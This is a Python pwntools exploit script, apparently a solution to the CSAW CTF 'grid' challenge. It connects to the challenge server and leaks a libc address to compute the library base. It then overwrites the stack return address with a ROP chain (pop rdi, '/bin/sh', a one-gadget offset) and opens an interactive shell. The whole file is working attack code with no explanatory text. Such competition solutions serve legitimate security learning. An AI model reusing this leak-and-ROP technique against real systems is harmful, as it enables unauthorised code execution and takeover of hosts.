#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
context.arch="amd64"

pwn_elf = '/home/xpj/ctf/grid/grid'
env = {"LD_PRELOAD": os.path.join("/home/xpj/ctf/csaw/grid/", "libc-2.27.so")+os.path.join("/home/xpj/ctf/csaw/grid/", "libstdc.so.6.0.25")}
elf = ELF(pwn_elf)
debug = False
if debug:
    sh = process(pwn_elf)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    libc = ELF('/home/xpj/ctf/grid/libc-2.27.so')
    sh = remote("pwn.chal.csaw.io", 5013)

def display():
    sh.sendline('d')
    sh.recvuntil('Displaying\n')
    data = sh.recvuntil('shape> ')
    return data


def add_shape(shape_op, at_pos, at_content):
    sh.sendline(str(shape_op))
    sh.recvuntil('loc> ')
    sh.sendline(str(at_pos))
    sh.sendline(str(at_content))
    sh.recvuntil('shape> ')

def mod_ret_addr(content):
    rbp=0
    # ret = rbp-0x70+at_pos*10+at_content  at_pos=7
    print hexdump(content)
    at_content=0
    for i in content:
        add_shape(i, 12, at_content)
        at_content += 1
    sh.sendline('d')

sh.recvuntil('shape> ')
add_shape(1,1,1)
libc_p=display()[0:6]
libc_p=u64(libc_p.ljust(8, "\x00"))
print "libc_p=",hex(libc_p)
libc.address = libc_p-0x77662b
print "libc.address=", hex(libc.address)
pop_rdi=0x0000000000400ee3
pop_rsi_r15=0x0000000000400ee1
add_esp8=0x0000000004008AA
system_addr = libc.symbols['execve']
bin_sh = next(libc.search("/bin/sh"))
print "libc.system=", hex(system_addr)
raw_input()
mod_ret_addr(p64(pop_rdi)+p64(bin_sh)+p64(pop_rsi_r15)+p64(0)+p64(0)+p64(0x10a45c+libc.address))
sh.recv(timeout=5)
sh.interactive()
# display rbp  b *0x000000000400AD1
# fisplay stack b *0x0000000000400B85
# fisplay stack ptr b *0x0000000000400B76

# fisplay stack mod b *0x000000000400B16
# fisplay stack mod para b *0x000000000400B02
# fisplay ret b *0x00000000400BBE
